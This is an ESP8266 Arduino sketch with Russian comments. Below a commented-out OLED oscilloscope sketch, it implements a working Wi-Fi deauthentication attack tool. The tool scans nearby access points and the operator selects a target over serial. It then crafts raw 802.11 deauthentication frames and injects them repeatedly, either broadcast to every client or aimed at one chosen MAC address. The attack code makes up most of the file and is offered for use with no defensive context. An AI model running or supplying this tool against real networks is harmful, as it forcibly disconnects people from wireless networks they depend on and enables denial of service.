// #include <Wire.h>
// #include <Adafruit_GFX.h>
// #include <Adafruit_SSD1306.h>

// // Настройки дисплея
// #define SCREEN_WIDTH 128
// #define SCREEN_HEIGHT 64
// #define OLED_RESET    -1
// Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// // Настройки осцилографа
// const int analogPin = A0;  // Пин для аналогового сигнала
// const int sampleRate = 100; // Частота дискретизации (микросекунды)
// const int bufferSize = SCREEN_WIDTH; // Размер буфера для хранения данных
// int buffer[bufferSize]; // Буфер для хранения значений сигнала

// void setup() {
//   // Инициализация дисплея
//   if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { // Адрес дисплея 0x3C
//     Serial.println(F("SSD1306 allocation failed"));
//     for(;;);
//   }
//   display.clearDisplay();
//   display.setTextSize(1);
//   display.setTextColor(SSD1306_WHITE);
//   display.setCursor(0, 0);
//   display.println("Oscilloscope");
//   display.display();
//   delay(2000);
// }

// void loop() {
//   // Заполнение буфера данными
//   for (int i = 0; i < bufferSize; i++) {
//     buffer[i] = analogRead(analogPin);
//     delayMicroseconds(sampleRate);
//   }

//   // Очистка дисплея
//   display.clearDisplay();

//   // Отрисовка сигнала
//   for (int i = 0; i < bufferSize - 1; i++) {
//     int y1 = map(buffer[i], 0, 1023, SCREEN_HEIGHT - 1, 0);
//     int y2 = map(buffer[i + 1], 0, 1023, SCREEN_HEIGHT - 1, 0);
//     draw(i, y1, y2);
//   }

//   // Вывод на дисплей
//   display.display();
// }


// void draw(int x,int y1,int y2){
//   display.drawLine(x, y1, x + 1, y2, SSD1306_WHITE);
// }

#include <ESP8266WiFi.h>
#include <user_interface.h> // Используем вместо esp_wifi.h

// Настройки
#define MAX_SCAN_RESULTS 20 // Максимальное количество точек доступа для сканирования
struct WiFiAccessPoint {
  String ssid;
  uint8_t bssid[6];
  int channel;
};
WiFiAccessPoint apList[MAX_SCAN_RESULTS]; // Список точек доступа
int apCount = 0; // Количество найденных точек доступа
int selectedAP = -1; // Выбранная точка доступа
uint8_t targetClient[6] = {0}; // MAC-адрес целевого клиента
bool deauthAll = false; // Флаг для деаутентификации всех клиентов

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA); // Переводим ESP8266 в режим станции
  WiFi.disconnect(); // Отключаемся от всех сетей
  delay(100);

  scanNetworks(); // Сканируем доступные сети
  printNetworks(); // Выводим список сетей
}

void loop() {
  if (Serial.available()) {
    char input = Serial.read();

    if (input == 's') { // Сканировать сети
      scanNetworks();
      printNetworks();
    } else if (input >= '0' && input <= '9') { // Выбор сети
      selectedAP = input - '0';
      if (selectedAP >= 0 && selectedAP < apCount) {
        Serial.print("Выбрана сеть: ");
        Serial.println(apList[selectedAP].ssid);
        selectMode(); // Выбор режима (все клиенты или один клиент)
      } else {
        Serial.println("Неверный выбор сети.");
      }
    } else if (input == 'd') { // Деаутентификация
      if (selectedAP != -1) {
        if (deauthAll) {
          deauthAllClients(apList[selectedAP].bssid, apList[selectedAP].channel);
        } else {
          deauthClient(apList[selectedAP].bssid, apList[selectedAP].channel, targetClient);
        }
      } else {
        Serial.println("Сначала выберите сеть.");
      }
    }
  }
}

// Сканирование доступных сетей
void scanNetworks() {
  Serial.println("Сканирование сетей...");
  apCount = WiFi.scanNetworks(false, true); // Сканируем сети
  if (apCount > MAX_SCAN_RESULTS) apCount = MAX_SCAN_RESULTS;

  for (int i = 0; i < apCount; i++) {
    apList[i].ssid = WiFi.SSID(i);
    memcpy(apList[i].bssid, WiFi.BSSID(i), 6); // Копируем MAC-адрес
    apList[i].channel = WiFi.channel(i);
  }
}

// Вывод списка сетей
void printNetworks() {
  Serial.println("Доступные сети:");
  for (int i = 0; i < apCount; i++) {
    Serial.print(i);
    Serial.print(": ");
    Serial.print(apList[i].ssid);
    Serial.print(" (");
    Serial.print("канал ");
    Serial.print(apList[i].channel);
    Serial.print(") ");
    for (int j = 0; j < 6; j++) {
      Serial.print(apList[i].bssid[j], HEX);
      if (j < 5) Serial.print(":");
    }
    Serial.println();
  }
  Serial.println("Введите номер сети для выбора.");
}

// Выбор режима (все клиенты или один клиент)
void selectMode() {
  Serial.println("Выберите режим:");
  Serial.println("1. Деаутентификация всех клиентов");
  Serial.println("2. Деаутентификация одного клиента");
  while (!Serial.available());
  char mode = Serial.read();

  if (mode == '1') {
    deauthAll = true;
    Serial.println("Режим: Деаутентификация всех клиентов.");
  } else if (mode == '2') {
    deauthAll = false;
    Serial.println("Введите MAC-адрес клиента (формат: XX:XX:XX:XX:XX:XX):");
    while (!Serial.available());
    String mac = Serial.readStringUntil('\n');
    if (parseMacAddress(mac, targetClient)) {
      Serial.println("Целевой клиент: " + mac);
    } else {
      Serial.println("Неверный формат MAC-адреса.");
    }
  } else {
    Serial.println("Неверный выбор режима.");
  }
}

// Парсинг MAC-адреса
bool parseMacAddress(String mac, uint8_t* target) {
  if (mac.length() != 17) return false;
  for (int i = 0; i < 6; i++) {
    target[i] = strtoul(mac.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
  return true;
}

// Деаутентификация всех клиентов в сети
void deauthAllClients(uint8_t* bssid, int channel) {
  uint8_t deauthPacket[26] = {0}; // Деаутентификационный пакет

  // Заголовок пакета
  deauthPacket[0] = 0xC0; // Тип пакета (деаутентификация)
  deauthPacket[1] = 0x00; // Флаги
  deauthPacket[2] = 0x00; // Длина пакета (заполняется автоматически)
  deauthPacket[3] = 0x00;

  // MAC-адрес получателя (широковещательный адрес)
  for (int i = 0; i < 6; i++) {
    deauthPacket[4 + i] = 0xFF; // FF:FF:FF:FF:FF:FF
  }

  // MAC-адрес отправителя (точка доступа)
  for (int i = 0; i < 6; i++) {
    deauthPacket[10 + i] = bssid[i];
  }

  // MAC-адрес точки доступа
  for (int i = 0; i < 6; i++) {
    deauthPacket[16 + i] = bssid[i];
  }

  // Причина деаутентификации (0x0007 — не авторизован)
  deauthPacket[24] = 0x07;
  deauthPacket[25] = 0x00;

  // Отправка пакета
  wifi_set_channel(channel);
  wifi_promiscuous_enable(1); // Включаем режим мониторинга
  for (int i = 0; i < 10; i++) { // Отправляем несколько пакетов для надежности
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    delay(100);
  }
  wifi_promiscuous_enable(0); // Отключаем режим мониторинга
  Serial.println("Деаутентификационные пакеты отправлены всем клиентам!");
}

// Деаутентификация одного клиента
void deauthClient(uint8_t* bssid, int channel, uint8_t* client) {
  uint8_t deauthPacket[26] = {0}; // Деаутентификационный пакет

  // Заголовок пакета
  deauthPacket[0] = 0xC0; // Тип пакета (деаутентификация)
  deauthPacket[1] = 0x00; // Флаги
  deauthPacket[2] = 0x00; // Длина пакета (заполняется автоматически)
  deauthPacket[3] = 0x00;

  // MAC-адрес получателя (целевой клиент)
  for (int i = 0; i < 6; i++) {
    deauthPacket[4 + i] = client[i];
  }

  // MAC-адрес отправителя (точка доступа)
  for (int i = 0; i < 6; i++) {
    deauthPacket[10 + i] = bssid[i];
  }

  // MAC-адрес точки доступа
  for (int i = 0; i < 6; i++) {
    deauthPacket[16 + i] = bssid[i];
  }

  // Причина деаутентификации (0x0007 — не авторизован)
  deauthPacket[24] = 0x07;
  deauthPacket[25] = 0x00;

  // Отправка пакета
  wifi_set_channel(channel);
  wifi_promiscuous_enable(1); // Включаем режим мониторинга
  for (int i = 0; i < 10; i++) { // Отправляем несколько пакетов для надежности
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    delay(100);
  }
  wifi_promiscuous_enable(0); // Отключаем режим мониторинга
  Serial.println("Деаутентификационные пакеты отправлены целевому клиенту!");
}